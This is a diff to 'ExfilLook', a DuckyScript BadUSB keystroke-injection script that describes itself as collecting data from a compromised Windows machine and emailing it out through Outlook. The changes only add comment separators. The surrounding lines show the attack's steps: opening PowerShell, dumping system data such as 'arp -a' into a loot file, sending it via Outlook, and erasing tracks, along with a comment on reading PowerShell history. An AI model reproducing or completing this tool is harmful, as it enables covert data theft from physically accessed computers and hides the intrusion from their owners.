@@ -6,9 +6,11 @@ REM - (  _)   /  \   (  _) _||_   |  `.  |  `. | \_____/ || \_____/ | ||\ \
 REM -  `.__).' /\ `.  )/  (_/\_) (.-.__)(.-.__)'. `---' .`'. `---' .`(/\)\ `.  
 REM -      (_.'  `._)(            `-'    `-'     `-...-'    `-...-'       `._) 
 REM - by Jonmar Corpuz
+REM -------------------------- 
 
 REM - ExfilLook is a tool used to fetch data from a compromised Windows system and exfiltrate that data through Outlook.
 REM - ExfilLool is a BadUSB script written in DuckyScript
+REM -------------------------- 
 
 REM - Step 1: Add an Outlook account (If one already exists then the command won't really do anything)
 REM -------------------------- 
@@ -38,6 +40,7 @@ DELAY 2000
 ENTER
 DELAY 500
 ALT F4
+REM -------------------------- 
 
 REM - Step 2: Open PowerShell.exe
 REM -------------------------- 
@@ -48,6 +51,7 @@ DELAY 500
 STRING PowerShell.exe
 DELAY 500
 ENTER
+REM -------------------------- 
 
 REM - Step 3: Fetch target data 
 REM -------------------------- 
@@ -110,6 +114,7 @@ DELAY 500
 STRING arp -a >> Oops.txt
 DELAY 500
 ENTER
+REM -------------------------- 
 
 REM - Step 4: Exfiltrate the generated text file containing the loot using Outlook
 REM -------------------------- 
@@ -153,6 +158,7 @@ DELAY 500
 STRING $outlook.Quit()
 DELAY 500
 ENTER
+REM -------------------------- 
 
 REM - Step 5: Erase our tracks from the compromised system
 REM -------------------------- 
@@ -169,5 +175,6 @@ ENTER
 
 REM - Check PowerShell History
 REM - Get-Content (Get-PSReadlineOption).HistorySavePath
+REM -------------------------- 
 
 
